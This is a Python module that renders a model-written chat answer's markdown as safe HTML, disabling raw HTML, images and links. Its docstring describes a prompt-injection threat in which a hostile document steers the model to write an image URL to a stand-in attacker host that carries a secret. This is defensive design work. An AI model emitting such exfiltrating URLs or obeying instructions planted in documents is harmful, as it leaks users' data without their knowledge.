"""An answer's own formatting, rendered safely (S6).

The answer-writer prompt already invites "a short list when the document
itself lists things", so a real answer arrives with `- ` bullets and
`**bold**` in it. Before this module the chat screen printed those marks
as literal characters. This turns them into the HTML they stand for.

WHAT IS SWITCHED OFF, and why each one:

* Raw HTML (`html_block`, `html_inline`, and `html=False`). The answer is
  written by a model from the operator's documents, so a `<script>` in a
  PDF can reach it. With HTML off, markdown-it escapes it into visible
  text, exactly as Jinja did before.
* Images. A model steered by a hostile document could write
  `![](https://attacker/?q=<secret>)`, and the browser would fetch that
  URL the moment the answer rendered -- the data leaves with no click.
  Images are not rendered at all; the text stays as typed.
* Links and autolinks. Sanad's evidence is the source cards, never a URL
  the model chose; the prompt forbids made-up references for the same
  reason. A link would also be a clickable exit to a site no document
  named.

WHAT IS KEPT: paragraphs, emphasis, lists, tables, headings, blockquotes,
code. `breaks=True` keeps a single newline as a line break, which is what
the old `white-space: pre-line` rendering showed, so an answer that used
plain line breaks looks the same as it did.

F-14: every block element gets `dir="auto"`, so one answer mixing a French
sentence and an Arabic article reads each line in its own direction -- the
same per-element rule the bubbles already follow.
"""

from __future__ import annotations

from functools import lru_cache

from markdown_it import MarkdownIt
from markupsafe import Markup

# Block tags that hold prose. `ul`/`ol`/`table` are containers whose own
# direction the browser takes from the page; their items decide per line.
_DIRECTIONAL_TAGS = frozenset(
    {"p", "li", "td", "th", "h1", "h2", "h3", "h4", "h5", "h6", "blockquote"}
)


@lru_cache(maxsize=1)
def _parser() -> MarkdownIt:
    md = MarkdownIt(
        "commonmark",
        {"html": False, "linkify": False, "typographer": False, "breaks": True},
    )
    md.enable("table")
    md.disable(["image", "link", "autolink", "html_inline", "html_block"])
    return md


def render_answer(text: str) -> Markup:
    """The answer as safe HTML. Markup-safe because markdown-it escaped
    every character of the source that is not formatting syntax."""
    md = _parser()
    tokens = md.parse(text)
    for token in tokens:
        if token.nesting == 1 and token.tag in _DIRECTIONAL_TAGS:
            token.attrSet("dir", "auto")
        if token.type == "table_open":
            # Wide tables scroll inside the bubble, never the page.
            token.attrSet("class", "prose__table")
    return Markup(md.renderer.render(tokens, md.options, {}))
